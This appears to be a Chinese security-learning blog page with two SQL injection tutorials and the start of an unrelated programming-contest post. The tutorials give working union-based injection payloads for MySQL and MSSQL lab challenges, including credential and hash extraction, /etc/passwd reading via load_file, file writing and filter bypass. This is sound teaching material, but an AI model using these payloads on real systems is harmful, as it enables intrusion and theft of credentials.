<p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</p>
<p><strong>常见原因</strong></p>
<p>基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 </p>
<h6 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h6><p>Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p>
<h6 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h6><p>数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p>
<p>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p>
<h6 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h6><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</p>
<h6 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h6><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p>
<h6 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h6><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</p>
<p>应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p>
<p> 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。</p>
<h2 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h2><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a9944c5-8c6e-4cce-a49c-9415ce187723" alt="image"></p>
<p>知识点：</p>
<p>1、数据库版本在5.0以上就是高版本，需要用information_schema有据查询</p>
<p>在Mysql5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息</p>
<p>2、数据库中符号”.”代表下一级，dbqyw.user表示dbqyw数据库下的user表名</p>
<p>information_schema.schemata：记录所有数据库名信息的表</p>
<p>information_schema.tables：记录所有表名信息的表</p>
<p>information_schema.columns：记录所有列名信息的表</p>
<p>schema_name：数据库名</p>
<p>table_name：表名</p>
<p>column_name：列名</p>
<p>table_schema：数据库名</p>
<p>3、猜解多个数据可以采用 limit x,1 变动猜解</p>
<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、判断注入点</span><br><span class="line">老办法：</span><br><span class="line">and 1=1 页面正常</span><br><span class="line">and 1=2 页面错误</span><br><span class="line">可能存在注入点，但是这个老方法现在用的少了，用最新的</span><br><span class="line"></span><br><span class="line">2、猜测列名数量（字段数）</span><br><span class="line">order by x x回显正常，x+1回显错误，有x个字段</span><br><span class="line"></span><br><span class="line">3、猜解</span><br><span class="line">最前面的1改成-1</span><br><span class="line">-1 union select 1,2,...,x</span><br><span class="line">显示几，几就是注入点</span><br><span class="line"></span><br><span class="line">4、信息收集</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库用户：user()</span><br><span class="line">操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>

<h5 id="版本探测的意义"><a href="#版本探测的意义" class="headerlink" title="版本探测的意义"></a>版本探测的意义</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库</span><br><span class="line">相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</span><br></pre></td></tr></table></figure>

<h5 id="Mysql数据库结构"><a href="#Mysql数据库结构" class="headerlink" title="Mysql数据库结构"></a>Mysql数据库结构</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据库A = 网站A</span><br><span class="line">    表名</span><br><span class="line">        列名</span><br><span class="line">            数据</span><br><span class="line">。。。。。。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要层层递进得到数据</p>
<h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">注入点为2，查询数据库mozhe_Discuz_StormGroup的表名</span><br><span class="line">-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;</span><br><span class="line">表名为StormGroup_member，只显示了一个表名，如果要显示所有，就加上group_concat</span><br><span class="line">-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;</span><br><span class="line">显示了所有表名StormGroup_member,notice</span><br><span class="line"></span><br><span class="line">查询表StormGroup_member的列名 </span><br><span class="line">-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;StormGroup_member&#x27;</span><br><span class="line">列名为id,name,password,status</span><br><span class="line"></span><br><span class="line">查询指定数据</span><br><span class="line">-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</span><br><span class="line">name为mozhe和mozhe</span><br><span class="line">password为356f589a7df439f6f744ff19bb8092c0和aa47b6f4aebaad8799e735b0e31dfc1c</span><br><span class="line">对于这道题，题目提示了password经过的md5加密，解密后password为dsan13和807150，第一个被禁用了，第二个可以正常登录得到key</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/01/Web-SQLi1/" data-id="cls21u8kr0000rsvf2nzfdj7k" data-title="SQLi1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-SQLi2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/01/Web-SQLi2/" class="article-date">
  <time class="dt-published" datetime="2024-02-01T09:26:10.000Z" itemprop="datePublished">2024-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/01/Web-SQLi2/">SQLi2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="SQL注入-MySQL注入"><a href="#SQL注入-MySQL注入" class="headerlink" title="SQL注入 MySQL注入"></a>SQL注入 MySQL注入</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image">  </p>
<h5 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h5><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
<p>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
<ul>
<li><strong>SCHEMATA表</strong></li>
</ul>
<p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p>
<p>获取到数据库名称</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| information_schema | utf8                       |</span><br><span class="line">| challenges         | gbk                        |</span><br><span class="line">| mysql              | latin1                     |</span><br><span class="line">| performance_schema | utf8                       |</span><br><span class="line">| security           | gbk                        |</span><br><span class="line">+--------------------+----------------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>TABLES 表</li>
</ul>
<p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables <span class="built_in">limit</span> 0,5;</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS                        |</span><br><span class="line">| def           | information_schema | COLLATIONS                            |</span><br><span class="line">| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| def           | information_schema | COLUMNS                               |</span><br><span class="line">| def           | information_schema | COLUMN_PRIVILEGES                     |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>COLUMNS 表</li>
</ul>
<p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>USER_PRIVILEGES 表</li>
</ul>
<p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USER_PRIVILEGES <span class="built_in">limit</span> 0,5;</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | SELECT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | INSERT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | UPDATE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | DELETE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | CREATE         | YES          |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">load_file()：读取函数</span><br><span class="line">into outfile或into dumpfile：导出函数</span><br><span class="line">路径获取常见方法：</span><br><span class="line">报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line">-1 union select 1,load_file(&#x27;文件路径&#x27;),3</span><br><span class="line">写入文件</span><br><span class="line">-1 union select 1,&#x27;x&#x27;,3 into outfile &#x27;文件路径&#x27;--+</span><br><span class="line">文件路径符号用/，如果是\，要写成\\</span><br><span class="line"></span><br><span class="line">常见文件读取列表：</span><br><span class="line"></span><br><span class="line">常见文件写入问题：魔术引号开关</span><br><span class="line">magic_quotes_gpc</span><br><span class="line"></span><br><span class="line">魔术引号及常见防护</span><br><span class="line"></span><br><span class="line">低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br><span class="line"></span><br><span class="line">SQL语句干扰符号：&#x27; &quot; % ) &#125; 等，具体看写法</span><br></pre></td></tr></table></figure>

<p>参考地址：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
<p>load_file						文件读取</p>
<p>into outfile 或into dumpfile		文件写入</p>
<p>查询是否有写入的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Value</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NULL</td>
<td>不允许导入或导出</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>只允许在 &#x2F;tmp 目录导入导出</td>
</tr>
<tr>
<td>空</td>
<td>不限制目录</td>
</tr>
</tbody></table>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
<ul>
<li>文件读取</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>): root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line"></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>读取敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
<p>如果存在过滤，比如说，把select替换为fuck，可以使用大写绕过过滤，写为Select，mysql对关键字大小写不敏感</p>
<p>select  * from user where name like ‘%qyw%’</p>
<p>那么前面带qyw或者后面带qyw的都会被搜出来</p>
<p>值传递的方式，get，post，cookie，request</p>
<p>cookie提交方式，抓包，添加数据</p>
<p>Cookie: 参数&#x3D;参数值</p>
<p>request是全部接受，用get，post或cookie都可以接受，我们大部分是黑盒测试，不知道对方代码是怎么写的，所以不知道接收数据时采用的是什么方法，如果采用的是request，那随便提交，如果是单一的，在注入时要使用到一些方法，有一些可以修改绕过提交方式</p>
<p>server提交方式，可以获取浏览器的一些值<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuazi/p/9765012.html">$_SERVER详解 - 刷哥 - 博客园 (cnblogs.com)</a></p>
<h5 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h5><p>提交的时候写成这种</p>
<p>…</p>
<p>{</p>
<p>​	“username”:”admin”,</p>
<p>​	“password”:”123456”</p>
<p>}</p>
<p>或者直接抓个包，按那种格式提交数据</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f61f381e-2c5b-4b0f-ac1d-a6e4b2c6561c" alt="image"></p>
<h5 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数据库类型：Access、MySQL、SQL server、</span><br><span class="line">结构</span><br><span class="line">access</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">MySQL等</span><br><span class="line">	数据库名</span><br><span class="line">		表名</span><br><span class="line">			列名</span><br><span class="line">				数据</span><br><span class="line">我们进行sql注入时，用到的权限是由连接数据库的用户权限决定的</span><br><span class="line">access数据库在进行注入时，不需要union select，因为它只有一个数据库，直接查询信息就行，它也没有收集数据库名信息，表名信息的表，所以在就行注入时，就只能进行暴力猜</span><br><span class="line">1、判断有几列</span><br><span class="line">2、暴力猜</span><br><span class="line"></span><br><span class="line">遗留问题：</span><br><span class="line">access注入时，暴力破解如果列名或表名猜解不到</span><br></pre></td></tr></table></figure>

<h5 id="MSSQL（SQL-server）注入"><a href="#MSSQL（SQL-server）注入" class="headerlink" title="MSSQL（SQL server）注入"></a>MSSQL（SQL server）注入</h5><p>MSSQL注入 </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
<p>例题为墨者学堂 SQL手工注入漏洞测试(Sql Server数据库)</p>
<p>解题步骤：</p>
<p><strong>1、判断是否是MSSQL</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure>

<p>sysobjects是sql server独有的一个数据库</p>
<p><strong>2、判断数据库版本</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select @@version),22,4)=&#x27;2005&#x27;--适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2005的话就返回正常）</span><br></pre></td></tr></table></figure>

<p><strong>3、判断回显</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于题目中3是字符类型，所以要加引号</span><br><span class="line">?id=-2 union all select 1,2,&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p><strong>4、数据库名称</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,db_name(),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>得到数据库名称为 mozhe_db_v2</p>
<p><strong>5、爆表</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>当xtype&#x3D;’U’ 代表是用户建立的表</p>
<p>得到表名为manage</p>
<p><strong>6、爆字段</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>解释一下col_name()，与object（）</p>
<p>object ()：数据库中每个对象都有一个唯一的id值，object_id(name)可以根据表对象名称得到表对象的ID，object_id()只能返回用户创建的对像的ID,像以sys开头的表都是系统表所以返回不了的</p>
<p>col_name（）：可以根据id值得到对像的名称，而且可以返回指定下标的结果.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),2) from sysobjects),&#x27;3&#x27;,4 得username</span><br><span class="line"></span><br><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),3) from sysobjects),&#x27;3&#x27;,4 得password</span><br></pre></td></tr></table></figure>

<p>说明mange表总共有3列，分别为：id、username、password</p>
<p><strong>7、爆数据</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select username from manage) ,(select password from manage where username in (&#x27;admin_mz&#x27;)),4</span><br></pre></td></tr></table></figure>

<p>得到username为admin_mz</p>
<p>password为72e1bfc3f01b7583，MD5解密，password为97285101</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/01/Web-SQLi2/" data-id="cls43dxy50000rkvfanov8qc7" data-title="SQLi2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240131" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/31/20240131/" class="article-date">
  <time class="dt-published" datetime="2024-01-31T10:49:35.000Z" itemprop="datePublished">2024-01-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/31/20240131/">20240131</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="202312-1-仓库规划"><a href="#202312-1-仓库规划" class="headerlink" title="202312-1 仓库规划"></a>202312-1 仓库规划</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T180">http://118.190.20.162/view.page?gpid=T180</a></p>
<p>用三层循环逐个比较</p>
<p>代码：</p>
